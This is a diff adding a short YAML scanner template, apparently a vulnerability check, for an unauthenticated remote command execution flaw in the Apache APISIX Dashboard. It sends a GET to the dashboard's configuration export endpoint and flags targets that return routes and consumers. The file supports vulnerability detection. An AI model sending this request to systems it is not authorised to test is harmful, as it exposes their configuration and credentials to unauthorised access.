@@ -1,0 +1,19 @@
+id: poc-yaml-apache-apisix-dashboard-unauth
+info:
+  name: Apache APISIX Dashboard 未授权远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: APISIX
+requests:
+- method: GET
+  path: /apisix/admin/migrate/export
+  expression: 'status_code == 200 &&
+
+    contains(body, "\"Routes\":[") &&
+
+    contains(body, "\"Consumers\"")
+
+    '
+variables: {}
+transport: http
